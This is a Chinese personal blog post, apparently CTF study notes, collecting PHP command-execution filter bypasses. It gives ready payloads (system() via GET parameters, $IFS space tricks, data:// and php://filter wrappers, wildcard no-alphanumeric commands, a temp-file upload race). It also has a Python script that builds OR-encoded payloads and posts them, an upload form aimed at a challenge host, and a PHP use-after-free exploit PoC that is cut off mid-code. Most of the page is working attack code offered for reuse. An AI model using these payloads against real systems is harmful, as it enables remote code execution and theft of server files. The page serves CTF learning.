@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"liu1272.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":50,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/config.min.js"></script>
+
+    <meta name="description" content="命令执行首先看过滤了什么东西，再按照下面的方法一点一点绕过。再利用没过滤的字符构造playload很多是可以泛用的，如果能找到一个很好用的也不错。 前置知识 &lt;?&#x3D;&#96;ls &#x2F;&#96;;?&gt;等效于&lt;?php echo &#96;ls &#x2F;&#96;; ?&gt;  ?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;ls \&#96;;闭合第一个php，然后构造第二个短标签形式的php  php文件上传时，一般是将文件上传到临时目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Robin">
+<meta property="og:description" content="命令执行首先看过滤了什么东西，再按照下面的方法一点一点绕过。再利用没过滤的字符构造playload很多是可以泛用的，如果能找到一个很好用的也不错。 前置知识 &lt;?&#x3D;&#96;ls &#x2F;&#96;;?&gt;等效于&lt;?php echo &#96;ls &#x2F;&#96;; ?&gt;  ?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;ls \&#96;;闭合第一个php，然后构造第二个短标签形式的php  php文件上传时，一般是将文件上传到临时目">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-08T11:37:00.000Z">
+<meta property="article:modified_time" content="2023-09-10T17:44:58.000Z">
+<meta property="article:author" content="Shunyu">
+<meta property="article:tag" content="日报">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","path":"2023/04/08/命令执行/","title":"命令执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>命令执行 | Robin</title>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/baidu-analytics.min.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?[object Object]"></script>
+
+  <script async src="//assets.growingio.com/2.1/gio.js"></script>
+  <script class="next-config" data-name="growingio_analytics" type="application/json">{"enable":false}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/growingio.min.js"></script>
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;[object Object]&quot;}'></script>
+
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "[object Object]");
+</script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Robin" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Robin</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">LiuGuobin's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">111</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E8%84%9A%E6%9C%AC%E6%88%96%E5%BF%AB%E6%8D%B7%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">上面提到的一些小脚本或快捷命令</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shunyu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Shunyu</p>
+  <div class="site-description" itemprop="description">Welcome</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/liu1272" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;liu1272" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1265257855@qq.com" title="E-Mail → mailto:1265257855@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shunyu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Robin">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="命令执行 | Robin">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-08 19:37:00" itemprop="dateCreated datePublished" datetime="2023-04-08T19:37:00+08:00">2023-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-11 01:44:58" itemprop="dateModified" datetime="2023-09-11T01:44:58+08:00">2023-09-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%97%A5%E6%8A%A5/" itemprop="url" rel="index"><span itemprop="name">日报</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span id="/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-meta-item leancloud_visitors" data-flag-title="命令执行" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+
+          # 置顶图标
+          
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p>
+<p>前置知识</p>
+<pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;
+
+?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的php
+
+php文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方
+
+PHP的一些标签有
+&lt;?...?&gt;
+&lt;%...%&gt;
+&lt;?php ...?&gt;
+&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;
+</code></pre>
+<p>各种绕过手法</p>
+<pre><code>【过滤变量名】
+重构变量
+?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;
+匹配符绕过
+?c=echo `cat fl&#39;&#39;ag.php`;
+?c=echo `cat fl/ag.txt`;
+?c=echo `cat fl*`;
+php里反引号相当于system执行系统命令
+两个引号分割是shell特性，执行时会自动忽略
+还有一点，过滤php时可以用Php大写绕过（乐~）
+
+
+【过滤system】
+system()
+assert()
+passthru()
+exec()           //只执行无回显
+shell_exec()     // 只执行无回显
+popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );
+proc_open()      //不会直接返回执行结果，而是返回一个文件指针
+pcntl_exec()
+call_user_func()
+还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt
+
+
+【过滤cat】
+more:一页一页的显示档案内容
+less:与 more 类似
+head:查看头几行
+tac:从最后一行开始显示，是 cat 的反向显示
+tail:查看尾几行
+nl：显示的时候，顺便输出行号
+od:以二进制的方式读取档案内容
+vi:一种编辑器，这个也可以查看
+vim:一种编辑器，这个也可以查看
+sort:可以查看
+uniq:可以查看
+file -f:报错出具体内容
+sh /flag 2&gt;%261  //报错出文件内容
+strings:可以查看
+rev:反过来看
+新增一个xxd可以读取文件
+curl file:///flag 也行
+bash -v:/etc/passwd
+date -f:好像可以越权读取文件
+/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat
+
+
+【过滤空格】
+&lt;
+&lt;&gt;
+%09
+%20
+$IFS
+$&#123;IFS&#125;
+$IFS$9
+$IFS$1
+顺便提一句，%09表示的是制表符，是shell里的空格，而不是php的空格
+因为浏览器会自动对特殊字符进行编码
+所以使用%09表示制表符也是可以被浏览器正确识别的
+
+
+【过滤;】
+使用?&gt;替换，因为最后一句不用分号
+include，也就是说应该传入一个文件名
+include的文件中出错了但是主程序会继续往下执行
+
+
+【过滤括号】
+使用不用括号的函数(伪协议)
+?c=php://filter/read=convert.base64-encode/resource=flag.php
+伪协议也可以重构变量
+?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt
+
+
+【PHP伪协议】
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+
+
+【文件按包含漏洞】
+使用data://协议执行PHP代码
+?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码
+?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志
+此处让网页直接包含我们写入的代码，从而执行恶意命令
+但是仍然要绕过对flag的过滤
+
+
+【常用套娃函数】
+session_id()：用来获取/设置当前会话 ID，可以获取phpsessionid，并且值是可控的
+getallheaders()：返回所有的HTTP头信息
+get_defined_vars() 返回一个包含所有已定义变量列表的多维数组
+array_pop() 是删除并返回数组最后一个元素
+current() 返回数组中的当前元素的值。别名是pos()
+next() 返回数组中的下一个元素的值。
+end()最后一个
+prev() 将数组中的内部指针倒回一位
+each() 返回数组中当前的键/值对并将数组指针向前移动一步
+scandir() 函数返回指定目录中的文件和目录的数组。
+print_r() 函数用于打印变量，以更容易理解的形式展示。
+localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）
+current() 函数返回数组中的当前元素的值。别名是pos()
+array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。
+read_file()  读出源码
+highlight_file()  读出源码
+show_source()  读出源码
+include()  读出源码
+file_get_contents()  读出源码
+还能先include(&quot;文件&quot;)再echo $变量;
+还能先require(&quot;文件&quot;)再echo $变量;
+还能先include(&quot;文件&quot;);再var_dump(get_defined_vars());
+
+
+【套娃例子】
+要使用POST传参时:
+?c=eval(array_pop(next(get_defined_vars())));
+cmd=system(“cat flag.php”);
+不使用POST传参时:
+?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+在COOKIE处传马时:
+/?c=show_source(session_id(session_start()));
+再把PHPSSID值设为flag.php
+只使用POST传参时:
+c=print_r(scandir(&#39;.&#39;));
+
+
+【重定向绕过】
+0   标准输入
+1   标准输出
+2   错误输出
+/dev/null(空设备)丢弃一切写入其中的数据(但报告写入操作成功)
+区别：
+   2&gt;/dev/null   把错误输出到空设备（即丢弃）
+   2&gt;&amp;1 &gt;/dev/null   错误输出到屏幕上，而标准输出被丢弃
+   &gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1错误和标准输出都输出到空设备
+重定向&gt;和&gt;&gt;：
+   前者会先清空文件再写入内容，后者会将重定向的内容追加到现有文件的尾部
+使用;  &amp;&amp;  %0a  ||等等绕过即可
+因为过滤代码只将最后一个命令输出到null，使用;或运算符分隔就行
+但是要注意所用的PHP版本会影响效果，多试试。
+
+
+【无字母数字的命令执行】
+/bin/base64以base64加密输出文件
+所以payload: /?c=/???/????64 ????.???
+或者
+/usr/bin/bzip2将文件压缩为文件名.bz2然后访问
+payload: /?c=/???/???/????2 ????.???
+
+
+【文件上传形式的命令执行】
+原理是通过POST上传一个文件，文件内容是要执行的命令
+使用点命令执行该文件时形成条件竞争
+这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径
+[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）
+之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。
+就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。
+POST的参数为
+?c=.%20/???/????????[@-[]
+上传下面的内容可以达到命令执行的效果
+#!  /bin/bash
+ls
+
+
+【数学整数计算】
+$(())表示运算符计算，且默认相加，~是取反的意思
+$(())能进行的运算有 + - * / % &amp; | ^ ! AND OR XOR NOT
+    $(()) = 0
+    ~$(()) = -0
+    $((~$(()))) = -1
+    $((~$(()))) = -1
+    ~$((~$(()))) = 1
+    echo $((a+b*c)) = 19
+    $(($((~ $(()))) $((~ $(()))) $((~ $(()))))) = -3
+
+
+【命令执行后继续对回显操作】
+（1）使用exit();直接退出。
+（2）使用POST方法查找目录(post参数可以直接被执行的时候)
+c=$a=&quot;glob:// /*.txt&quot;;
+  if ($b = opendir($a)) &#123;
+    while(($file = readdir($b))) !== false) &#123;
+      echo&quot;filename:&quot;.$file.&quot;\n&quot;;
+    &#125;
+    closedir($b);
+  &#125;
+exit(0);
+（3）在POST传参获取mysql数据
+c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=数据库名&#39;, &#39;账号&#39;,&#39;密码&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;文件名&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);
+（4）用POST方法重定向文件内容输出到其他地方
+c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/要读的文件&gt;存到那个文件&quot;);exit();
+
+【使用bash内置变量构造RCE】
+因为一般题目都在/var/www/html下
+经过多次尝试，最后能构造出nl
+在加上通配符？匹配文件
+$&#123;HOME:~0&#125;
+$&#123;PATH:~0&#125;
+$&#123;PWD:~A&#125;
+$&#123;USER:~A&#125;
+</code></pre>
+<h5 id="上面提到的一些小脚本或快捷命令"><a href="#上面提到的一些小脚本或快捷命令" class="headerlink" title="上面提到的一些小脚本或快捷命令"></a>上面提到的一些小脚本或快捷命令</h5><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p>
+<pre><code>import re
+import urllib
+import requests
+from urllib import parse
+
+ hex_i = &quot;&quot;
+ hex_j = &quot;&quot;
+ pattern=&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;# str1=[&quot;system&quot;,&quot;cat flag.php&quot;]# for p in range(2):
+     t1 = &quot;&quot;
+     t2 = &quot;&quot;
+     for k in str1[p]:
+         for i in range(256):
+             for j in range(256):
+                 if re.search(pattern,chr(i)) :
+                     break
+                 if re.search(pattern,chr(j)) :
+                     continue
+                 if i &lt; 16:
+                     hex_i = &quot;0&quot; + hex(i)[2:]
+                 else:
+                     hex_i=hex(i)[2:]
+                 if j &lt; 16:
+                     hex_j=&quot;0&quot;+hex(j)[2:]
+                 else:
+                     hex_j=hex(j)[2:]
+                 hex_i=&#39;%&#39;+hex_i
+                 hex_j=&#39;%&#39;+hex_j
+                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))
+                 if(c ==k):
+                     t1=t1+hex_i
+                     t2=t2+hex_j
+                     break
+             else:
+                 continue
+             break
+     payload = &quot;(\&quot;&quot;+t1+&quot;\&quot;|\&quot;&quot;+t2+&quot;\&quot;)&quot;
+     print(payload)
+
+payload=&#39;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&#39;
+print(payload)
+data=&#123;
+    &quot;c&quot;:urllib.parse.unquote(payload)
+&#125;
+url=&quot;??????&quot;
+re=requests.post(url,data=data)
+print(re.text)
+</code></pre>
+<p>下面是文件上传的页面</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://40ebaa4e-8bb9-4a0d-ba18-623eea11822d.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+session_start();
+?&gt;
+</code></pre>
+<p>利用PHP垃圾回收漏洞显示出文件内容POC，记得编码</p>
+<pre><code>&lt;?php
+function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123; 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace = debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+
+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+
+    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) &#123;
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+
+    function ptr2str($ptr, $m = 8) &#123;
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) &#123;
+            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;= 8;
+        &#125;
+        return $out;
+    &#125;
+
+    function write(&amp;$str, $p, $v, $n = 8) &#123;
+        $i = 0;
+        for($i = 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;= 8;
+        &#125;
+    &#125;
+
+    function leak($addr, $p = 0, $s = 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+
+    function parse_elf($base) &#123;
+        $e_type = leak($base, 0x10, 2);
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+        for($i = 0; $i &lt; $e_phnum; $i++) &#123;
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; 
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; 
+                $text_size = $p_memsz;
+            &#125;
+        &#125;
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                if($deref != 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+
+    function get_binary_base($binary_leak) &#123;
+        $base = 0;
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) &#123;
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+
+    function get_system($basic_funcs) &#123;
+        $addr = $basic_funcs;
+        do &#123;
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+            if($f_name == 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr += 0x20;
+        &#125; while($f_entry != 0);
+        return false;
+    &#125;
+
+    function trigger_uaf($arg) &#123;
+        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+    &#125;
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
